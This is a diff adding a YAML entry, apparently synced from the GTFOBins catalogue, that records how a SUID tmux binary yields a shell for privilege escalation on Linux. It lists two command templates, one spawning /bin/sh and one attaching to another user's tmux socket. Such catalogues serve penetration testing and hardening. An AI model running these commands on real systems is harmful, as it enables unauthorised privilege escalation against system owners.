@@ -1,0 +1,26 @@
+id: gtfobins/tmux/shell/suid
+type: binary
+platform: linux
+name: tmux
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: tmux -c /bin/sh
+- template: tmux -S /path/to/socket
+  comment: Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).
+references:
+- https://gtfobins.github.io/gtfobins/tmux/
+tags:
+- linux
+- unix
+- gtfobins
